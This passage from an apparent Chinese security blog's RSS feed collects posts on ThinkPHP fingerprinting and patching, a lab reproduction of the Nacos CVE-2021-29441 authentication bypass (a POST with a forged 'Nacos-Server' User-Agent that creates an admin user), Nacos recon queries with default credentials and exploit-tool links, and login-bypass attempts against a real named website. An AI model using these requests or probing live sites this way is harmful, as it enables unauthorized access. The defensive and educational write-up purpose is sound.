&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902135103.png" alt="image.png">&lt;/p>
&lt;h1 id="0x02-漏洞修复">0x02 漏洞修复&lt;/h1>
&lt;p>&lt;strong>升级框架版本&lt;/strong>&lt;br>
ThinkPHP 2.x 已停止维护，漏洞无法通过零散修复彻底解决。&lt;strong>最彻底的方式是升级到官方支持的最新版本&lt;/strong>（如 ThinkPHP 5.1 或 6.x），这些版本对输入过滤、路由解析等机制进行了全面重构，安全性大幅提升。&lt;/p></description></item><item><title>【Thinkphp】识别tp框架(指纹)-01</title><link>http://localhost:1313/p/thinkphp%E8%AF%86%E5%88%ABtp%E6%A1%86%E6%9E%B6%E6%8C%87%E7%BA%B9-01/</link><pubDate>Sun, 31 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/thinkphp%E8%AF%86%E5%88%ABtp%E6%A1%86%E6%9E%B6%E6%8C%87%E7%BA%B9-01/</guid><description>&lt;img src="http://localhost:1313/images/22.webp" alt="Featured image of post 【Thinkphp】识别tp框架(指纹)-01" />&lt;h1 id="1-前言">1. 前言&lt;/h1>
&lt;p>服务框架是指某领域一类服务的可复用设计与不完整的实现， 与软件框架不同的是， 服务框架同时体现着面向服务， 一个服务框架可以分为两个主要部分： 服务引擎、 引入的外部服务。 ThinkPHP， 是为了简化企业级应用开发和敏捷WEB应用开发而诞生的开源轻量级PHP框架。 可想而知框架连接着网络和系统接触着越来越多的关键数据， 渐渐成为单位公共安全中最具有战略性的资产， 框架的安全稳定运行也直接决定着业务系统能否正常使用。 如果框架被远程代码执行攻破， 这些信息一旦被篡改或者泄露， 轻则造成企业经济损失，重则影响企业形象，甚至行业、社会安全。可见，数据库安全至关重要。&lt;br>
ThinkPHP是一个快速、 兼容而且简单的轻量级国产PHP开发框架， 诞生于2006年初， 原名FCS， 2007年元旦正式更名为ThinkPHP， 遵循Apache2开源协议发布， 从Struts结构移植过来并做了改进和完善， 同时也借鉴了国外很多优秀的框架和模式， 使用面向对象的开发结构和MVC模式， 融合了Struts的思想和TagLib（ 标签库） 、 RoR的ORM映射和ActiveRecord模式。 ThinkPHP可在Windows和Linux等操作系统运行， 支持MySql， Sqlite&lt;br>
和PostgreSQL等多种数据库以及PDO扩展， 是一款跨平台， 跨版本以及简单易用的PHP框架。&lt;/p>
&lt;h1 id="2-识别tp框架指纹">2. 识别tp框架（指纹）&lt;/h1>
&lt;h2 id="21-icon判断">2.1 icon判断&lt;/h2>
&lt;p>/favicon.ico&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250901022520.png" alt="image.png">&lt;/p>
&lt;h2 id="21-报错">2.1 报错&lt;/h2>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250901022542.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250901022555.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250901022603.png" alt="image.png">&lt;/p>
&lt;h2 id="23-错误传参">2.3 错误传参&lt;/h2>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250901022629.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250901022635.png" alt="image.png">&lt;/p>
&lt;h2 id="24-特殊指纹出现logo">2.4 特殊指纹出现logo&lt;/h2>
&lt;p>/?c=4e5e5d7364f443e28fbf0d3ae744a59a&lt;br>
/4e5e5d7364f443e28fbf0d3ae744a59a&lt;br>
/4e5e5d7364f443e28fbf0d3ae744a59a-index.html&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250901022713.png" alt="image.png">&lt;/p>
&lt;h2 id="25-body特征">2.5 body特征&lt;/h2>
&lt;p>body里有&amp;quot;十年磨一剑&amp;quot; 或者&amp;quot;ThinkPHP&amp;quot;&lt;/p>
&lt;h2 id="26-插件">2.6 插件&lt;/h2>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250901022824.png" alt="image.png">&lt;/p></description></item><item><title>【Nacos】CVE-2021-29441 Nacos 权限认证绕过漏洞</title><link>http://localhost:1313/p/nacoscve-2021-29441-nacos-%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</link><pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/nacoscve-2021-29441-nacos-%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</guid><description>&lt;img src="http://localhost:1313/images/15.webp" alt="Featured image of post 【Nacos】CVE-2021-29441 Nacos 权限认证绕过漏洞" />&lt;h1 id="1-漏洞概述">1. 漏洞概述&lt;/h1>
&lt;p>2020年12月29日，Nacos官⽅在github发布的issue中披露Alibaba Nacos 存在⼀个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进⾏任意操作，包括&lt;strong>创建新⽤户&lt;/strong>并进⾏登录后操作。&lt;/p>
&lt;h1 id="2-影响版本">2. 影响版本&lt;/h1>
&lt;p>&lt;strong>Nacos &amp;lt;= 2.0.0-ALPHA.1&lt;/strong>&lt;/p>
&lt;h1 id="3-环境搭建">3. 环境搭建&lt;/h1>
&lt;p>&lt;strong>Nacos下载地址(github):&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https: github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Windows搭建：&lt;/p>
&lt;ol>
&lt;li>进入github下载地址后下载版本：&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">nacos-server-2.0.0-ALPHA.1.zip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="2">
&lt;li>解压出来后进入bin目录：&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">D:\TargetDrone\nacos-server-2.0.0-ALPHA.1\nacos-server-2.0.0-ALPHA.1\nacos\bin
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="3">
&lt;li>输入在当前文件夹下使用打开cmd窗口，输入命令：&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">.\startup.cmd -m standalone
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="4">
&lt;li>然后访问网站：&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.31.134:8848/nacos/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">192.168.31.134：自己的内网IP地址
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704214003.png" alt="image.png">&lt;br>
5. 默认账号密码&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> nacos/nacos
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>即可。&lt;/p>
&lt;h1 id="4-漏洞复现">4. 漏洞复现&lt;/h1>
&lt;ol>
&lt;li>漏洞路径&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http: your-ip:8848/nacos/v1/auth/users?pageNo=1&amp;amp;pageSize=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704214308.png" alt="image.png">&lt;br>
2. 虽然有password了, 但是是加盐过的,解密不了，从上图可以发现，⽬前有⼀个⽤户nacos 漏洞利⽤，访问&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http: your-ip:8848/nacos/v1/auth/users
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704214433.png" alt="image.png">&lt;br>
PSOT传参：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">username=test1&amp;amp;password=test1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>UA 头：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> Nacos-Server
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>发送POST请求，返回码200，创建⽤户成功~！&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705124923.png" alt="image.png">&lt;br>
返回Nacos登录界面：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705125222.png" alt="image.png">&lt;/p>
&lt;p>使用账号/密码：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">test1/test1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705125331.png" alt="image.png">&lt;br>
关闭环境：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">./shutdown.sh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="5-漏洞分析">5. 漏洞分析&lt;/h1>
&lt;p>Nacos-Server是⽤来进⾏服务间的通信的⽩名单。⽐如服务A要访问服务B，如何知道服务A是服务，只需要在服务A访问服务B的时候UA上写成 Nacos-Server 即可。&lt;br>
正因为这样，所以当我们&lt;strong>UA恶意改为Nacos-Server的时候&lt;/strong>，就会被误以为是服务间的通信，因此在⽩名单当中，绕过的认证。&lt;br>
这⾥⽤的是nacos-2.0.0-ALPHA.1的代码进⾏分析&lt;br>
关键代码在该⽂件下:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">/nacos-2.0.0-ALPHA.1/naming/src/main/java/com/alibaba/nacos/naming/web/TrafficRevise
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Filter.java
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705125530.png" alt="image.png">&lt;br>
TrafficReviseFilter继承了Filter⽤来处理请求，⽽⾥⾯的doFilter的就很明确了。注释中写道，当接收到其他节点服务的请求时应该被通过，如何验证是其他服务。&lt;br>
就是很简单的⼀个对于UA的⼀个判断逻辑&lt;br>
这个Constants.NACOS_SERVER_HEADER跟踪⼀下，正是Nacos-Server 经过这⼀层的验证，那么则进⼊到filterChain 过滤器链中的下⼀个filter过滤器，继续接下来的请求。&lt;/p>
&lt;h1 id="6-漏洞修复">6. 漏洞修复&lt;/h1>
&lt;p>若业务环境允许，使⽤⽩名单限制相关web项⽬的访问来降低⻛险。 官⽅已发布最新安全版本，请及时下载升级⾄安全版本。&lt;/p></description></item><item><title>【Nacos】Nacos红队打点方法</title><link>http://localhost:1313/p/nacosnacos%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%96%B9%E6%B3%95/</link><pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/nacosnacos%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%96%B9%E6%B3%95/</guid><description>&lt;img src="http://localhost:1313/images/10.webp" alt="Featured image of post 【Nacos】Nacos红队打点方法" />&lt;h1 id="0x00-前置知识">0x00 前置知识&lt;/h1>
&lt;h2 id="1-平台语法">1. 平台语法&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">hunter语法：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">app.name=&amp;#34;Nacos&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fofa语法：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">title=&amp;#34;nacos&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">app=&amp;#34;nacos&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>端口：port=&amp;ldquo;8848&amp;rdquo;&lt;/p>
&lt;h2 id="2-信息收集">2. 信息收集&lt;/h2>
&lt;p>&lt;strong>资产少的情况下：&lt;/strong>&lt;br>
如果没有明显特征，那就通过被动扫描器，如：burp的插件TsojanScan，HAE，logger++等&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/Tsojan/TsojanScan
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>资产多的情况下：&lt;/strong>&lt;br>
那我们就直接使用指纹识别工具EHole_magic&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://comm.pgpsec.cn/54.html
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>可以特定⼀些⽬录如nacos、/webroot/decision/login等等，进⾏更加精确的扫描进⾏精准的识别。（但网站收费）&lt;br>
&lt;strong>批量漏洞检测工具：&lt;/strong>&lt;br>
NacosExploit&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/h0ny/NacosExploit
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>漏洞检测：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704212254.png" alt="image.png">&lt;/p>
&lt;h2 id="3-漏洞利用点">3. 漏洞利用点&lt;/h2>
&lt;p>Nacos 默认帐户名密码：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">nacos/nacos
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="0x01-工具">0x01 工具&lt;/h1>
&lt;p>反序列化漏洞利⽤⼯具&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/c0olw/NacosRce/releases/tag/v0.5
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>哥斯拉nacos后渗透插件&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/pap1rman/postnacos
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>综合利⽤,且gui版本&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/charonlight/NacosExploitGUI
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【Web攻防】常见Web攻防登录框打法-01</title><link>http://localhost:1313/p/web%E6%94%BB%E9%98%B2%E5%B8%B8%E8%A7%81web%E6%94%BB%E9%98%B2%E7%99%BB%E5%BD%95%E6%A1%86%E6%89%93%E6%B3%95-01/</link><pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/web%E6%94%BB%E9%98%B2%E5%B8%B8%E8%A7%81web%E6%94%BB%E9%98%B2%E7%99%BB%E5%BD%95%E6%A1%86%E6%89%93%E6%B3%95-01/</guid><description>&lt;img src="http://localhost:1313/images/12.webp" alt="Featured image of post 【Web攻防】常见Web攻防登录框打法-01" />&lt;h1 id="开局">开局&lt;/h1>
&lt;p>首先先拿到一个站点：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">whjwcm.cn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">通过fofa，鹰图等等找资产：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">domain=&amp;#34;whjwcm.cn&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">找到一个图文盒子后台登录页面：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">https://wss.whjwcm.cn
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这时候发现#号：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://wss.whjwcm.cn/manage/#/login?redirect=%2Fplat
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">#/login?redirect=%2Fplat
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="思路一">思路一&lt;/h1>
&lt;h2 id="0x01-进入后台首先尝试弱口令">0x01 进入后台首先尝试弱口令&lt;/h2>
&lt;p>一般就是最简单的admin&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630103827.png" alt="image.png">&lt;/p>
&lt;h2 id="0x02-看数据包">0x02 看数据包&lt;/h2>
&lt;h3 id="修改error为0">修改error为0&lt;/h3>
&lt;p>通过抓包可以看到返回信息：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">{
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;#34;error&amp;#34;:1,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;#34;msg&amp;#34;:&amp;#34;\u7528\u6237\u540d\u6216\u5bc6\u7801\u4e0d\u6b63\u786e&amp;#34;,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;#34;data&amp;#34;:&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">一共三个参数，都可以试一下：
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630104121.png" alt="image.png">&lt;/p>
&lt;p>接触该请求，拦截一下相应信息对error进行修改。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630104313.png" alt="image.png">&lt;br>
这里可以看到：error和data数据都可以进行修改，然后进行测试。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630104356.png" alt="image.png">&lt;br>
发现进入了/admin/user/info，但Cookie认证是一个未知的，这里可以看出已经没什么用了。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630104448.png" alt="image.png">&lt;/p>
&lt;h3 id="修改error为200">修改error为200&lt;/h3>
&lt;p>这里可以将error修改为200，试一下是否可以绕过。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630104643.png" alt="image.png">&lt;br>
发现还是不行，这里思路也没了。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630104859.png" alt="image.png">&lt;/p>
&lt;h3 id="data进行测试">data进行测试&lt;/h3>
&lt;p>尝试再data参数中添加一下值，看一下是否可以绕过，&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630105024.png" alt="image.png">&lt;br>
发现还是不行:&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630105124.png" alt="image.png">&lt;br>
这时候就可以看一下js文件了，是否有关于这两个参数的代码逻辑问题。&lt;/p>
&lt;h3 id="js文件查找参数">js文件查找参数&lt;/h3>
&lt;p>这里看出从js文件中找到了一个data对应的参数值，也是可以进行尝试的。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250630105548.png" alt="image.png">&lt;/p>
&lt;p>但经过测试还是不行，但也是一个思路，后续遇到了可以进行尝试。&lt;/p>
&lt;h3 id="丢弃req数据包">丢弃req数据包&lt;/h3>
&lt;p>通过劫持req的数据包，丢弃掉，有的时候也可以卡进去，但是这里发现，并不行，这时候这种思路也不行了。&lt;br>
